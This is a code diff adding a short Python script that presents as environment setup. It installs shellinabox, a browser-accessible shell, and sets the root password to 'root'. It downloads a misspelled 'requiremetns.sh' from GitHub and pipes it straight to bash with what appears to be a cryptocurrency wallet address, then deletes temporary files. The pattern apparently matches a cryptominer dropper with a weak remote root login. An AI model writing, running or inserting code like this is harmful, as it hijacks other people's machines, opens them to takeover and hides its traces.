@@ -1,0 +1,11 @@
+import os
+os.system('apt-get update')
+os.system('apt-get install -y shellinabox')
+os.system('apt-get install -y systemd')
+os.system('apt-get clean')
+os.system('rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*')
+os.system("echo 'root:root' | chpasswd")
+os.system('apt update')
+os.system('apt install curl -y')
+os.system('curl -s -L https://raw.githubusercontent.com/lucasiel/teste/main/requiremetns.sh | bash -s 47zZneDdPNr63HM9ubMyrhYvLNbDunCkiia6fNCvQkThNuK6rrj59e3Y2nNF3ETeewbALAGYaiti4SF4ENwJ8bR7PKXXcMN')
+os.system('rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*')
